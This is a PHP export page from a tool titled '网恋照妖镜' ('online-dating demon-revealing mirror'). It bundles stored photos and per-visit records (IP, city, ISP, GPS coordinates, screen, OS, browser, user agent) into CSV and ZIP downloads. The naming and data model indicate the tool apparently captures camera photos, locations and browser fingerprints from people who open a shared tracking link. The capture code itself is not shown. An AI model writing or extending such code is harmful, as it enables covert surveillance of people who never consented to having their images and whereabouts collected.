<?php
/**
 * Online-Mirror v3.0 - 数据导出
 * 功能：一键导出所有照片ZIP + 日志CSV
 */
require_once __DIR__ . '/config.php';
requireLogin();

$db = getDB();
$user = getCurrentUser();
$format = $_GET['format'] ?? '';

// 临时目录
$tmp_dir = sys_get_temp_dir() . '/mirror_export_' . uniqid();
@mkdir($tmp_dir, 0755, true);

// 清理函数
function cleanup() {
    global $tmp_dir;
    if (file_exists($tmp_dir)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($tmp_dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $f) {
            $f->isDir() ? @rmdir($f->getRealPath()) : @unlink($f->getRealPath());
        }
        @rmdir($tmp_dir);
    }
}

// ====== CSV导出 ======
if ($format === 'csv') {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="mirror_logs_' . date('Ymd_His') . '.csv"');
    header('Pragma: no-cache');
    
    // BOM for Excel
    echo "\xEF\xBB\xBF";
    
    // CSV头
    $headers = ['时间', '操作', '链接ID', 'IP地址', '城市', '运营商', '经纬度', '屏幕分辨率', '操作系统', '浏览器', '语言', 'User-Agent', '文件大小'];
    echo implode(',', array_map(function($h) { return '"' . str_replace('"', '""', $h) . '"'; }, $headers)) . "\n";
    
    // 查询所有照片数据
    $stmt = $db->query("SELECT p.*, l.redirect_url FROM mir_photos p LEFT JOIN mir_links l ON p.link_id = l.link_id ORDER BY p.created_at DESC");
    $photos = $stmt->fetchAll();
    
    foreach ($photos as $p) {
        $row = [
            $p['created_at'],
            '拍照',
            $p['link_id'],
            $p['ip_address'] ?? '',
            $p['city'] ?? '',
            $p['isp'] ?? '',
            ($p['lat'] && $p['lng']) ? $p['lat'] . ',' . $p['lng'] : '',
            $p['screen_resolution'] ?? '',
            $p['os'] ?? '',
            $p['browser'] ?? '',
            $p['browser_lang'] ?? '',
            $p['user_agent'] ?? '',
            $p['file_size'] ? round($p['file_size']/1024, 1) . 'KB' : '',
        ];
        echo implode(',', array_map(function($v) { return '"' . str_replace('"', '""', $v) . '"'; }, $row)) . "\n";
    }
    
    // 添加日志数据
    echo "\n\n=== 操作日志 ===\n";
    $log_headers = ['时间', '操作', '链接ID', 'IP地址', 'User-Agent'];
    echo implode(',', array_map(function($h) { return '"' . str_replace('"', '""', $h) . '"'; }, $log_headers)) . "\n";
    
    $stmt = $db->query("SELECT * FROM mir_logs ORDER BY created_at DESC");
    $logs = $stmt->fetchAll();
    foreach ($logs as $l) {
        $row = [$l['created_at'], $l['action'], $l['link_id'] ?? '', $l['ip_address'] ?? '', $l['user_agent'] ?? ''];
        echo implode(',', array_map(function($v) { return '"' . str_replace('"', '""', $v) . '"'; }, $row)) . "\n";
    }
    
    cleanup();
    exit;
}

// ====== ZIP导出 ======
if ($format === 'zip') {
    // 复制照片到临时目录
    $photo_dir = $tmp_dir . '/photos';
    @mkdir($photo_dir, 0755, true);
    
    $stmt = $db->query("SELECT * FROM mir_photos ORDER BY link_id, created_at ASC");
    $photos = $stmt->fetchAll();
    
    foreach ($photos as $p) {
        $src = IMG_DIR . $p['file_path'];
        if (file_exists($src)) {
            // 按ID分文件夹
            $subdir = $photo_dir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $p['link_id']);
            if (!file_exists($subdir)) mkdir($subdir, 0755, true);
            $dst = $subdir . '/' . $p['file_path'];
            copy($src, $dst);
        }
    }
    
    // 导出CSV到临时目录
    $csv_content = "\xEF\xBB\xBF"; // BOM
    $csv_headers = ['时间', '链接ID', 'IP地址', '城市', '运营商', '经纬度', '屏幕', '系统', '浏览器', '语言', '文件名'];
    $csv_content .= implode(',', array_map(function($h) { return '"' . str_replace('"', '""', $h) . '"'; }, $csv_headers)) . "\n";
    
    foreach ($photos as $p) {
        $row = [
            $p['created_at'], $p['link_id'], $p['ip_address'] ?? '',
            $p['city'] ?? '', $p['isp'] ?? '',
            ($p['lat'] && $p['lng']) ? $p['lat'] . ',' . $p['lng'] : '',
            $p['screen_resolution'] ?? '', $p['os'] ?? '', $p['browser'] ?? '', $p['browser_lang'] ?? '',
            $p['file_path']
        ];
        $csv_content .= implode(',', array_map(function($v) { return '"' . str_replace('"', '""', $v) . '"'; }, $row)) . "\n";
    }
    file_put_contents($tmp_dir . '/photo_data.csv', $csv_content);
    
    // 创建ZIP
    $zip_file = sys_get_temp_dir() . '/mirror_export_' . date('Ymd_His') . '.zip';
    
    $zip = new ZipArchive();
    if ($zip->open($zip_file, ZipArchive::CREATE) === true) {
        // 添加照片
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($photo_dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($files as $f) {
            $relative = 'photos/' . str_replace($photo_dir . '/', '', $f->getRealPath());
            if ($f->isDir()) {
                $zip->addEmptyDir($relative);
            } else {
                $zip->addFile($f->getRealPath(), $relative);
            }
        }
        // 添加CSV
        $zip->addFile($tmp_dir . '/photo_data.csv', 'photo_data.csv');
        $zip->close();
        
        // 下载
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="mirror_export_' . date('Ymd_His') . '.zip"');
        header('Content-Length: ' . filesize($zip_file));
        header('Pragma: no-cache');
        readfile($zip_file);
        
        // 清理
        @unlink($zip_file);
        cleanup();
        exit;
    }
    
    cleanup();
    die('ZIP创建失败');
}

// ====== 导出页面 ======
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>数据导出 · 网恋照妖镜</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh; color: #e0e0e0;
    display: flex; align-items: center; justify-content: center; padding: 20px;
}
.box {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px; padding: 40px;
    max-width: 500px; width: 100%; text-align: center;
}
.box h2 { font-size: 24px; margin-bottom: 8px; }
.box p.sub { color: #8080a0; margin-bottom: 28px; font-size: 14px; }
.card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px; padding: 20px; margin-bottom: 16px;
    text-align: left; transition: all 0.3s;
}
.card:hover { border-color: rgba(102,126,234,0.3); }
.card h3 { font-size: 16px; margin-bottom: 4px; }
.card p { font-size: 13px; color: #8080a0; margin-bottom: 12px; }
.card a {
    display: inline-block; padding: 10px 20px;
    border-radius: 10px; text-decoration: none;
    font-size: 14px; font-weight: 500; transition: all 0.3s;
}
.btn-csv { background: rgba(76,175,80,0.15); color: #4caf50; }
.btn-csv:hover { background: rgba(76,175,80,0.25); }
.btn-zip { background: rgba(102,126,234,0.15); color: #667eea; }
.btn-zip:hover { background: rgba(102,126,234,0.25); }
.back-link { margin-top: 12px; }
.back-link a { color: #667eea; text-decoration: none; font-size: 14px; }
.back-link a:hover { text-decoration: underline; }
</style>
</head>
<body>
<div class="box">
    <h2><i class="fas fa-download"></i> 数据导出</h2>
    <p class="sub">请选择导出格式</p>
    
    <div class="card">
        <h3><i class="fas fa-file-csv" style="color:#4caf50;"></i> CSV 导出</h3>
        <p>导出所有照片元数据和操作日志，包含GPS、浏览器指纹、IP归属地等完整信息。可用Excel打开。</p>
        <a href="?format=csv" class="btn-csv"><i class="fas fa-download"></i> 下载 CSV</a>
    </div>
    
    <div class="card">
        <h3><i class="fas fa-file-archive" style="color:#667eea;"></i> ZIP 导出</h3>
        <p>导出所有照片文件（按ID分文件夹）+ 配套CSV数据表。适合备份全部数据。</p>
        <a href="?format=zip" class="btn-zip"><i class="fas fa-download"></i> 下载 ZIP</a>
    </div>
    
    <div class="back-link">
        <a href="dashboard.php"><i class="fas fa-arrow-left"></i> 返回控制台</a>
    </div>
</div>
</body>
</html>
